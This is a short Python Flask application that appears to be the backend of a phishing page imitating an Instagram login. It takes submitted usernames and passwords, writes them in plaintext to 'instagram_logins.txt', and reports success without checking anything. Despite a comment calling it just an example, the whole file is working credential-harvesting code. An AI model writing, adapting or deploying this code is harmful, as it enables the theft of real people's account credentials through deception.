from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    success = False
    
    if request.method == "POST":
        # Get form data
        username = request.form.get("username")
        password = request.form.get("password")
        
        # Check login credentials here
        if username and password:
            # Save credentials logic (this is just an example)
            with open("instagram_logins.txt", "a") as file:
                file.write(f"Username: {username}, Password: {password}\n")
            
            success = True  # Set success to True if credentials are saved
    
    return render_template("index.html", success=success)  # Passing 'success' to template

if __name__ == "__main__":
    app.run(debug=True)
